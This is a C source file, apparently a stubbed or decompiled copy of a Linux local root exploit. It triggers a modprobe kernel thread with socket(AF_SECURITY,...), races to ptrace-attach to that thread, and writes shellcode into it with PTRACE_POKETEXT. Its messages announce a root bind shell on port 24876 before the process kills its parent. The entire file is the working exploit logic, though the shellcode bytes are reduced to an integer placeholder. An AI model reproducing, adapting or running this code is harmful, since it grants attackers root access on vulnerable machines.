
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct user_regs_struct {int eip; } ;
typedef int pid_t ;


 int AF_SECURITY ;
 int ESRCH ;
 int PTRACE_ATTACH ;
 int PTRACE_DETACH ;
 int PTRACE_GETREGS ;
 int PTRACE_POKETEXT ;
 int PTRACE_SYSCALL ;
 int SIGALRM ;
 int SIGCHLD ;
 int SIZE ;
 int SOCK_STREAM ;
 int alarm (int) ;
 int child ;
 int errno ;
 int exit (int ) ;
 int fork () ;
 int fprintf (int ,char*,...) ;
 int getpid () ;
 int k_child ;
 int kill (int,int) ;
 int parent ;
 int perror (char*) ;
 int ptrace (int ,int,int ,...) ;
 int shellcode ;
 int sigalrm ;
 int sigc ;
 int sigchld ;
 int signal (int ,int ) ;
 int socket (int ,int ,int) ;
 int stderr ;

main(int argc, char *argv[]) {

 int i, error;
 pid_t pid;

 struct user_regs_struct regs;

 parent=getpid();

 switch (pid=fork()) {

 case -1:
  perror("Can't fork(): ");
  break;

 case 0:

  child=getpid();
  k_child=child+1;

  fprintf(stderr, "-> Parent's PID is %d. Child's PID is %d.\n", parent, child);

  fprintf(stderr, "-> Attaching to %d...", k_child);
  signal(SIGCHLD,sigchld);
  signal(SIGALRM,sigalrm);
  alarm(10);

  while ((error=ptrace(PTRACE_ATTACH,k_child,0,0)==-1) && (errno==ESRCH)) {
   fprintf(stderr, ".");
  }

  if (error==-1) {
   fprintf(stderr,"-> Unable to attach to %d.\n",k_child);
   exit(0);
  }

  fprintf(stderr, "\n-> Got the thread!!\n");





  while(sigc<1);

  if (ptrace(PTRACE_SYSCALL,k_child,0,0)==-1) {
   fprintf(stderr,"-> Unable to setup syscall trace.\n");
   exit(0);
  }






  fprintf(stderr,"-> Waiting for the next signal...\n");
  while(sigc<2);

  if (ptrace(PTRACE_GETREGS,k_child,((void*)0),&regs)==-1) {
   perror("-> Unable to read registers: ");
  }

  fprintf(stderr, "-> Injecting shellcode at 0x%08x\n",regs.eip);

  for (i=0; i<=SIZE; i+=4) {
   if( ptrace(PTRACE_POKETEXT,k_child,regs.eip+i,*(int*)(shellcode+i))) {}
  }

  fprintf(stderr, "-> Bind root shell on port 24876... =p\n");






  if (ptrace(PTRACE_DETACH,k_child,0,0)==-1) {
   perror("-> Unable to detach from modprobe thread: ");
  }

  fprintf(stderr, "-> Detached from modprobe thread.\n");
  fprintf(stderr, "-> Committing suicide.....\n");

  if (kill(parent,9)==-1) {
   perror("-> We survived??!!??  ");
  }





  exit(0);

  break;

 default:
  signal(SIGALRM,sigalrm);
  alarm(10);
  socket(AF_SECURITY,SOCK_STREAM,1);
  break;
 }
 exit(0);

}
